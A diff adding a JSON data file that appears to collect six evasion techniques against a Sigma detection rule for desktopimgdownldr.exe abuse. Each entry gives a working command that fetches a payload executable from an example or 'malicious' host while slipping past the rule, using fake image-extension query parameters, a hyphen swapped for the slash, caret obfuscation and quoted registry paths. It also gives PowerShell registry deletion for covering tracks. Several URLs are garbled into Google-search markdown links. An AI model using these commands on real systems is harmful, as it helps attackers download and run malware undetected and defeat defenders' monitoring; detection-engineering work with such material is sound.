@@ -1,0 +1,26 @@
+[
+  {
+    "output": "desktopimgdownldr.exe /lockscreenurl:[http://example.com/payload.exe?.png](https://www.google.com/search?q=http://example.com/payload.exe%3F.png)",
+    "explanation": "The rule uses the 'selection1_filter' block to exclude commands containing standard image extensions like '.png'. By appending a URL parameter or fragment identifier (e.g., '?.png') to the executable path, the utility still retrieves the binary file correctly, but the filter matches and the alert is suppressed."
+  },
+  {
+    "output": "desktopimgdownldr.exe -lockscreenurl:[http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)",
+    "explanation": "The rule checks for a leading forward slash followed by a space (' /lockscreenurl:'). Substituting the forward slash with a hyphen ('-lockscreenurl:') allows the native Windows utility to process the argument normally while failing the explicit substring check."
+  },
+  {
+    "output": "cmd.exe /c \"desktopimgdownldr.exe /lockscreenurl:h^t^t^p://[example.com/payload.exe]()\"",
+    "explanation": "Using a caret symbol (^) inside the URL scheme acts as a command shell escape character. This breaks static substring signatures within the command line logging mechanism without hindering the functional network execution of the tool."
+  },
+  {
+    "output": "reg.exe delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\CloudStore\\Store\\Cache\\DefaultAccount\\\"PersonalizationCSP\"",
+    "explanation": "The 'selection_reg' block alerts on registry deletion sequences containing the precise phrase '\\PersonalizationCSP'. Breaking the contiguous keyword signature by adding quotes within the registry path subverts the exact pattern filter during static log analysis."
+  },
+  {
+    "output": "desktopimgdownldr.exe /lockscreenurl:[https://malicious.example.com/payload.exe?bypass=.jpg](https://www.google.com/search?q=https://malicious.example.com/payload.exe%3Fbypass%3D.jpg) /dest:C:\\Windows\\Temp\\payload.exe",
+    "explanation": "The Sigma rule filters out legitimate image downloads by checking if the command line contains '.jpg', '.jpeg', or '.png'. By appending a dummy query parameter containing '.jpg' to the malicious URL, the command triggers the 'selection1_filter' exclusion. Since the condition requires 'not selection1_filter', this successfully bypasses the detection."
+  },
+  {
+    "output": "powershell.exe -Command \"Remove-Item -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP' -Recurse\"",
+    "explanation": "The rule attempts to detect the cleanup of registry keys left by desktopimgdownldr by looking for the exact strings 'reg delete' and '\\PersonalizationCSP'. An attacker can bypass this by using PowerShell's Remove-Item cmdlet (or WMI/API calls) to delete the registry key instead of using the native reg.exe utility."
+  }
+]
